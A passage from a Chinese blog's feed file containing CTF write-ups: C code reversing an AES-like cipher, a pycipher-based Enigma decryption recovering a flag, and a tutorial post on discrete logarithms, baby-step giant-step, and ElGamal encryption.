__int8*)&amp;DwArr[<span class="number">64</span> * k + <span class="number">36864</span>] + i);</span><br><span class="line"><span class="keyword">if</span> (tmp2 == Enc[k]) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf(&quot;i:%d\n&quot;, i);</span></span><br><span class="line">arr2[k] = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, arr2[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> P2</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> tmp;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">256</span>; k++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> m = <span class="number">0</span>; m &lt; <span class="number">256</span>; m++) &#123;</span><br><span class="line">tmp = DwArr[<span class="number">29440</span> + i] ^ DwArr[<span class="number">29184</span> + j] ^ DwArr[<span class="number">28928</span> + k] ^ DwArr[<span class="number">28672</span> + m];</span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="number">0xac110172</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d, %d, %d, %d&quot;</span>, i, j, k, m);</span><br><span class="line"><span class="keyword">goto</span> End;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> P3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> test1[] = &#123;</span><br><span class="line"><span class="number">0x72</span>, <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0xac</span>, </span><br><span class="line"><span class="number">0x65</span>, <span class="number">0x5f</span>, <span class="number">0x18</span>, <span class="number">0x38</span>, </span><br><span class="line"><span class="number">0x30</span>, <span class="number">0xe2</span>, <span class="number">0x67</span>, <span class="number">0xad</span>, </span><br><span class="line"><span class="number">0x5c</span>, <span class="number">0x42</span>, <span class="number">0xe7</span>, <span class="number">0x0d</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> test2[] = &#123;</span><br><span class="line"><span class="number">0x72</span>, <span class="number">0x5f</span>, <span class="number">0x67</span>, <span class="number">0x0d</span>, </span><br><span class="line"><span class="number">0x65</span>, <span class="number">0xe2</span>, <span class="number">0xe7</span>, <span class="number">0xac</span>, </span><br><span class="line"><span class="number">0x30</span>, <span class="number">0x42</span>, <span class="number">0x11</span>, <span class="number">0x38</span>, </span><br><span class="line"><span class="number">0x5c</span>, <span class="number">0x01</span>, <span class="number">0x18</span>, <span class="number">0xad</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">unsigned char test1[] = &#123;</span></span><br><span class="line"><span class="comment">0,  1,  2,  3,</span></span><br><span class="line"><span class="comment">4,  5,  6,  7,</span></span><br><span class="line"><span class="comment">8,  9,  10, 11,</span></span><br><span class="line"><span class="comment">12, 13, 14, 15</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">unsigned char test2[] = &#123;</span></span><br><span class="line"><span class="comment">0, 5,10,15,</span></span><br><span class="line"><span class="comment">4, 9,14, 3,</span></span><br><span class="line"><span class="comment">8,13, 2, 7,</span></span><br><span class="line"><span class="comment">   12, 1, 6, 11</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">RevShiftBytes(test2);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, test1[i] - test2[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> TEST</span></span><br><span class="line"><span class="comment">// SBox + Shift</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> test1[] = &#123; <span class="number">99</span>, <span class="number">107</span>, <span class="number">103</span>, <span class="number">118</span>, <span class="number">242</span>, <span class="number">1</span>, <span class="number">171</span>, <span class="number">123</span>, <span class="number">48</span>, <span class="number">215</span>, <span class="number">119</span>, <span class="number">197</span>, <span class="number">254</span>, <span class="number">124</span>, <span class="number">111</span>, <span class="number">43</span> &#125;;</span><br><span class="line"><span class="comment">// SBox</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> test2[] = &#123; <span class="number">99</span>, <span class="number">124</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">48</span>, <span class="number">1</span>, <span class="number">103</span>, <span class="number">43</span>, <span class="number">254</span>, <span class="number">215</span>, <span class="number">171</span>, <span class="number">118</span> &#125;;</span><br><span class="line"><span class="comment">// SBox + Shift + Mix</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> test3[] = &#123; <span class="number">106</span>, <span class="number">106</span>, <span class="number">92</span>, <span class="number">69</span>, <span class="number">44</span>, <span class="number">109</span>, <span class="number">51</span>, <span class="number">81</span>, <span class="number">176</span>, <span class="number">217</span>, <span class="number">93</span>, <span class="number">97</span>, <span class="number">39</span>, <span class="number">156</span>, <span class="number">33</span>, <span class="number">92</span> &#125;;</span><br><span class="line"></span><br><span class="line">RevMixColumn(test3);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;RevMixColumn&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> h = <span class="number">0</span>; h &lt; <span class="number">16</span>; h++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, test3[h]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">RevShiftRow(test3);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;RevShiftBytes:&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> h = <span class="number">0</span>; h &lt; <span class="number">16</span>; h++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, test3[h]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">RevSubBytes(test3);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;RevSubBytes:&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> h = <span class="number">0</span>; h &lt; <span class="number">16</span>; h++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, test3[h]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//for (int i = 0; i &lt; 10; i++) &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> final_enc[] =</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x1d</span>, <span class="number">0xba</span>,<span class="number">0x82</span>,<span class="number">0x39</span>,</span><br><span class="line"><span class="number">0x1c</span>, <span class="number">0x25</span>,<span class="number">0x6b</span>,<span class="number">0x8d</span>,</span><br><span class="line"><span class="number">0x5</span>,  <span class="number">0x20</span>,<span class="number">0x99</span>,<span class="number">0xa2</span>,</span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x6d</span>,<span class="number">0xc</span>, <span class="number">0x4f</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">RevShiftRow(final_enc);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;RevShiftRow:&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> h = <span class="number">0</span>; h &lt; <span class="number">16</span>; h++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, final_enc[h]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">RevSubBytes(final_enc);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;RevSubBytes:&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> h = <span class="number">0</span>; h &lt; <span class="number">16</span>; h++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, final_enc[h]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">10</span>; i++) </span><br><span class="line">&#123;</span><br><span class="line">RevMixColumn(final_enc);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;RevMixColumn&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> h = <span class="number">0</span>; h &lt; <span class="number">16</span>; h++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, final_enc[h]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">RevShiftRow(final_enc);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;RevShiftRow:&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> h = <span class="number">0</span>; h &lt; <span class="number">16</span>; h++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, final_enc[h]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">RevSubBytes(final_enc);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;RevSubBytes:&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> h = <span class="number">0</span>; h &lt; <span class="number">16</span>; h++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, final_enc[h]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Finally:&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span> ,final_enc[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)final_enc);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> Final</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> a = <span class="number">8</span>; a &gt;= <span class="number">0</span>; --a) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> b = <span class="number">3</span>; b &gt;= <span class="number">0</span>; ) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">256</span>; k++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> m = <span class="number">0</span>; m &lt; <span class="number">256</span>; m++) &#123;</span><br><span class="line">tmp = DwArr[<span class="number">256</span> * (<span class="number">4</span> * b + <span class="number">3</span> + <span class="number">16</span> * a) + i] ^<span class="comment">// i == out[4*b + 3]</span></span><br><span class="line">  DwArr[<span class="number">256</span> * (<span class="number">4</span> * b + <span class="number">2</span> + <span class="number">16</span> * a) + j] ^<span class="comment">// j == out[4*b + 2]</span></span><br><span class="line">  DwArr[<span class="number">256</span> * (<span class="number">4</span> * b + <span class="number">1</span> + <span class="number">16</span> * a) + k] ^ <span class="comment">// k == out[4*b + 1]</span></span><br><span class="line">  DwArr[<span class="number">256</span> * (<span class="number">4</span> * b + <span class="number">0</span> + <span class="number">16</span> * a) + m];<span class="comment">// m == out[4*b + 0]</span></span><br><span class="line"><span class="keyword">if</span> (tmp == ((<span class="keyword">unsigned</span> <span class="keyword">int</span>*)Enc)[b]) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a:%2d; b:%2d | &quot;</span>, a, b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%02x, %02x, %02x, %02x \n&quot;</span>, i, j, k, m);</span><br><span class="line">Enc[<span class="number">4</span> * b] = m;</span><br><span class="line">Enc[<span class="number">4</span> * b + <span class="number">1</span>] = k;</span><br><span class="line">Enc[<span class="number">4</span> * b + <span class="number">2</span>] = j;</span><br><span class="line">Enc[<span class="number">4</span> * b + <span class="number">3</span>] = i;</span><br><span class="line"><span class="keyword">goto</span> Label1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Label1:</span><br><span class="line">--b;</span><br><span class="line">&#125;</span><br><span class="line">RevShiftBytes(Enc);</span><br><span class="line"><span class="comment">//putchar(&#x27;\n&#x27;);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> h = <span class="number">0</span>; h &lt; <span class="number">16</span>; h++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, Enc[h]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会不会是因为当时没人做所以又丢过来了？2333因为队里的re师傅复盘了这一题所以就有印象了</p><h2 id="赛博朋克人"><a href="#赛博朋克人" class="headerlink" title="赛博朋克人"></a>赛博朋克人</h2><p>之前打CTFshow的吃瓜杯了解到一个库叫pycipher，内置了enigma函数，可以直接调用。</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF/image-20210912111805833.png" alt="image-20210912111805833"></p><p>这个表显示了9月每一天的参数信息，接下来只需要找出是哪一天的参数即可</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF/image-20210912111851723.png" alt="image-20210912111851723"></p><p>根据题目给出的提示：当今网络世界有电子越共，那么也会有赛博德国人，而且还喜欢用相同的密码，请找出他们的通信内容(内容是德文，flag是正常的flag，而且通信的格式还原历史，传递密钥的方法为二战中后期改进的)。</p><p>之后查询了大量资料，总算是还原出了这些内容所代表的含义：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0911</span> = <span class="number">1</span>tle = <span class="number">1</span>tl = <span class="number">350</span> = RZS NAJ =</span><br><span class="line">nkfgp roqad <span class="keyword">boprv </span>yrdhy zwamf qsrhb owqvt <span class="keyword">jzotr </span>ffcjq snpqh kpwzm fprru gufez xsuws aohyw xbreu pifbz kagxj <span class="keyword">blbha </span><span class="keyword">jzixj </span>zrasn zxkay lpaza ejwou itcip dfdgp rbjnv xuqzq qhtya xwwik wyybx kdgrc slrkj pgjay aidwa <span class="keyword">jeszp </span>pbqat njojg <span class="keyword">jrplb </span>kkhot <span class="keyword">joqpg </span>vwecj soabm aupsr fenug ybxmr <span class="keyword">jloch </span>kmjgc tznxl tnrqx pbeph fwymn gpoor pjkkb plkwb kxzeq quorp ipuvs utyae qyzgp mqnai iysse gzsht tsrmv crrkr opuxj tqshv ypdrw rvnzt cstlj </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一行：9月11日的内容，总共一部分，这是第一部分，有350个字母（包括第一组的buchstabenkennngruppe)，所谓buchstabenkennngruppe NKFGP显示出了操作者的键位设置，用于加密信息。其中前两个为随机字母，后面三个为某一天的kennngruppe信息，根据上表可以知道这是用的9月10号的参数。于是可以确定rotors,ringstellung,steckers参数，那么初始设置settings呢？</p><p>别忘了，我们第一行还有两组字母，其中RZS是操作者的初始设置，而NAJ为结果，那么以RZS为初始键位设置，解密NAJ后得到的信息便是接收者需要设置的settings。reflector参数只可能是ABC，这里可以爆破。</p><p>综上，我们已经拿到了解密enigma所需要的全部信息。逐个尝试后发现用B的reflector解密出来的内容重复率很高，一开始卡住了。题目所说的是德国，正好我有个室友会德语，于是让他帮忙看一下，一眼就看出来是德文数字，于是翻译过来拿到结果一串字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pycipher <span class="keyword">import</span> Enigma</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.ascii_uppercase</span><br><span class="line">c=<span class="string">&#x27;roqadboprvyrdhyzwamfqsrhbowqvtjzotrffcjqsnpqhkpwzmfprrugufezxsuwsaohywxbreupifbzkagxjblbhajzixjzrasnzxkaylpazaejwouitcipdfdgprbjnvxuqzqqhtyaxwwikwyybxkdgrcslrkjpgjayaidwajeszppbqatnjojgjrplbkkhotjoqpgvwecjsoabmaupsrfenugybxmrjlochkmjgctznxltnrqxpbephfwymngpoorpjkkbplkwbkxzeqquorpipuvsutyaeqyzgpmqnaiiyssegzshttsrmvcrrkropuxjtqshvypdrwrvnztcstlj&#x27;</span>.upper()</span><br><span class="line">cc=<span class="string">&#x27;NAJ&#x27;</span></span><br><span class="line"></span><br><span class="line">eng=Enigma(settings=(<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;S&#x27;</span>),rotors=(<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>),reflector=<span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">                ringstellung=(<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>),steckers=[(<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;T&#x27;</span>),(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;V&#x27;</span>),</span><br><span class="line">                (<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;F&#x27;</span>),(<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;N&#x27;</span>),(<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>),(<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;O&#x27;</span>),(<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;W&#x27;</span>),(<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;U&#x27;</span>),(<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>),(<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;X&#x27;</span>)])</span><br><span class="line"></span><br><span class="line">n = eng.decipher(cc)</span><br><span class="line">eng=Enigma(settings=(n[<span class="number">0</span>],n[<span class="number">1</span>],n[<span class="number">2</span>]),rotors=(<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>),reflector=<span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">                ringstellung=(<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>),steckers=[(<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;T&#x27;</span>),(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;V&#x27;</span>),</span><br><span class="line">                (<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;F&#x27;</span>),(<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;N&#x27;</span>),(<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>),(<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;O&#x27;</span>),(<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;W&#x27;</span>),(<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;U&#x27;</span>),(<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>),(<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;X&#x27;</span>)])</span><br><span class="line">flag=eng.decipher(c)</span><br><span class="line">flag=flag.lower()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">## 475748547berta36623936373230356665373537393566313034383537316366346366623730337dora</span></span><br></pre></td></tr></table></figure><p>这里将erta和ora删去后，再hex转字符串就可以拿到flag了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#GWHT&#123;6b967205fe75795f1048571cf4cfb703&#125;</span><br></pre></td></tr></table></figure><p>最后，感谢万能的石神，有个小语种室友真好</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;z做了五道。话说最后一题sm4之后是个什么玩意？&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="RSA" scheme="http://sh1k4ku.github.io/tags/RSA/"/>
    
    <category term="Pell Equation" scheme="http://sh1k4ku.github.io/tags/Pell-Equation/"/>
    
    <category term="Enigma" scheme="http://sh1k4ku.github.io/tags/Enigma/"/>
    
  </entry>
  
  <entry>
    <title>离散对数</title>
    <link href="http://sh1k4ku.github.io/2021/08/31/2021/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/"/>
    <id>http://sh1k4ku.github.io/2021/08/31/2021/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/</id>
    <published>2021-08-31T03:57:16.000Z</published>
    <updated>2021-10-11T08:44:11.100Z</updated>
    
    <content type="html"><![CDATA[<p>离散对数(Discretelogarithm,简称DL)是一种基于同余运算和原根的一种对数运算。</p><span id="more"></span><h1 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h1><p>在群 G 中，g 为 G 的生成元，也就是说群 G 中每一个元素都可以写成 <script type="math/tex">y=g^k</script>，我们称 k 为 y 在群 G 中的对数，记作 <script type="math/tex">k=log_yg</script>。</p><script type="math/tex; mode=display">设 m≥1，(a,m)=1 ，使得 a^d≡1(mod\;m) 成立的最小正整数 d\\ 称为 a 对模 m 的指数或者阶，我们一般将其记为 \delta_m(a)。</script><script type="math/tex; mode=display">当 δ_m(a)=φ(m)时，称 a 是模 m 的原根，简称 m 的原根。</script><h1 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h1><script type="math/tex; mode=display">使得 a^d≡1(mod\;m) 成立的最小正整数 d ，满足d∣φ(m)。</script><script type="math/tex; mode=display">模 m 剩余系存在原根的充要条件是 m=2,4,p^α,2p^α ，其中 p 为奇素数， α 为正整数。</script><h1 id="离散对数问题"><a href="#离散对数问题" class="headerlink" title="离散对数问题"></a>离散对数问题</h1><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>给定<script type="math/tex">y≡g^x\;mod\;p</script>，<del>不</del>可以暴力枚举x来求解。（误</p><h2 id="BSGS"><a href="#BSGS" class="headerlink" title="BSGS"></a>BSGS</h2><p>全称是Baby-step giant-step，也叫小步大步法，使用了中间相遇的思想。</p><p>令<script type="math/tex">x=im+j，其中m=[\sqrt n]</script>，i和j都在0到m的范围内</p><p>因此<script type="math/tex">y=g^x=g^{im+j}</script></p><p>变换得<script type="math/tex">y(g^{-m})^i=g^j</script></p><p>之后我们就可以枚举所所有的j计算，并存在一i个集合S中，然后我们再次枚举i计算<script type="math/tex">y(g^{-m})^i</script>,只要发现计算的结果在S中则说明完成碰撞，得到了i和j。</p><p>BSGS是一个时间与空间的折中的方式，我们将一个 <script type="math/tex">O(n)</script>的时间复杂度，<script type="math/tex">O(1)</script> 空间复杂度的算法转换为了一个<script type="math/tex">O(\sqrt n)</script> 的时间复杂度和<script type="math/tex">O(\sqrt n)</script> 的空间复杂度的算法。</p><p>其中</p><ol><li>j每次增加表示“baby-step”</li><li>i每次增加表示”giant-step”</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsgs</span>(<span class="params">g,y,p,bound</span>):</span></span><br><span class="line">    m=gmpy2.iroot(bound,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    S=&#123;<span class="built_in">pow</span>(g,j,p):j <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m)&#125;</span><br><span class="line">    gs=<span class="built_in">pow</span>(g,-m,p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)：</span><br><span class="line">    <span class="keyword">if</span> y <span class="keyword">in</span> S:</span><br><span class="line">            <span class="keyword">return</span> i*m+S[y]</span><br><span class="line">        y=y * gs %p</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">g=</span><br><span class="line">y=</span><br><span class="line">p=</span><br><span class="line">bound=</span><br><span class="line">x=bsgs(g,y,p,bound)</span><br></pre></td></tr></table></figure><p>sagemath内置函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python</span></span><br><span class="line">bsgs(g,y,bounds,operation)</span><br></pre></td></tr></table></figure><h2 id="Pollard‘s-Rho-algorithm"><a href="#Pollard‘s-Rho-algorithm" class="headerlink" title="Pollard‘s Rho algorithm"></a>Pollard‘s Rho algorithm</h2><p>Pollard’s Rho 算法是一个非常有趣又容易理解的整数因子分解算法，原本用于分解RSA体系中的n，后来又应用于离散对数问题。</p><h1 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h1><h2 id="Elgamal-PKC"><a href="#Elgamal-PKC" class="headerlink" title="Elgamal PKC"></a>Elgamal PKC</h2><p>老规矩，Alice传消息给Bob：</p><script type="math/tex; mode=display">公开：大质数p和F^*_p下的生成元g\\1.Alice随机选择一个密钥a，计算A=g^a\;mod\;p,并将公钥A传给Bob（g和p其实也是公钥）\\2.Bob生成随机数k，计算c_1=g^k\;mod\;p,c_2=mA^k\;mod\;p\\3.Alice还原m：(c^a)^{-1}*c_2=(g^{ak})^{-1}*m(A^k)=(g^{ak})^{-1}*mg^{ak}=m\;mod\;p</script><p><img src="/images/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/image-20210906171507054.png" alt="image-20210906171507054"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;离散对数(Discretelogarithm,简称DL)是一种基于同余运算和原根的一种对数运算。&lt;/p&gt;</summary>
    
    
    
